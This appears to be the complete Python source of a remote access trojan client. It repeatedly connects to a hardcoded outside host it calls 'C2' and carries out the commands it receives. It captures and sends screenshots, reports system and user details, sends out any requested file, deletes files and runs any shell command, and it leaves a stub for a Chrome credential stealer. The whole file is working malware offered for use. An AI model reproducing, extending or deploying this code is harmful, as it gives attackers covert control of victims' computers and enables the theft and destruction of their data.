import socket
import subprocess
import os
import sys
import time
import mss
import pyautogui
from datetime import datetime
import shutil

# CONFIG
HOST = 'bore.pub'
PORT = 48911

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            print("[+] Connected to C2")
            
            while True:
                cmd = s.recv(4096).decode('utf-8', errors='ignore').strip()
                if not cmd:
                    continue

                try:
                    if cmd.lower() == "screenshot":
                        with mss.mss() as sct:
                            screenshot = sct.shot(output="screenshot.png")
                        with open("screenshot.png", "rb") as f:
                            data = f.read()
                        s.sendall(data)
                        s.send(b'END_SCREEN')
                        os.remove("screenshot.png")
                        print("[+] Screenshot sent")

                    elif cmd.lower() == "sysinfo":
                        info = f"""
OS: {os.name} - {sys.platform}
User: {os.getlogin()}
IP: {socket.gethostbyname(socket.gethostname())}
"""
                        s.send(info.encode())

                    elif cmd.lower().startswith("download "):
                        file_path = cmd.split(" ", 1)[1]
                        if os.path.exists(file_path):
                            with open(file_path, "rb") as f:
                                s.sendall(f.read())
                            s.send(b'END_FILE')
                        else:
                            s.send(b'File not found')

                    elif cmd.lower().startswith("upload "):

                        pass

                    elif cmd.lower() == "chrome":
                        s.send(b'Chrome stealer not implemented yet')

                    elif cmd.lower() == "list files":
                        files = "\n".join(os.listdir("."))
                        s.send(files.encode() if files else b'No files')

                    elif cmd.lower().startswith("delete "):
                        path = cmd.split(" ", 1)[1]
                        if os.path.exists(path):
                            os.remove(path)
                            s.send(b'File deleted')
                        else:
                            s.send(b'File not found')

                    else:
                        # Execute any command
                        output = subprocess.getoutput(cmd)
                        if output:
                            s.send(output.encode('utf-8', errors='ignore'))
                        else:
                            s.send(b'Command executed successfully')

                except Exception as e:
                    s.send(f'Error: {str(e)}'.encode())
                    
        except Exception as e:
            print(f"[-] Connection lost: {e}")
            time.sleep(5)  # Reconnect after 5 seconds

if __name__ == "__main__":
    connect()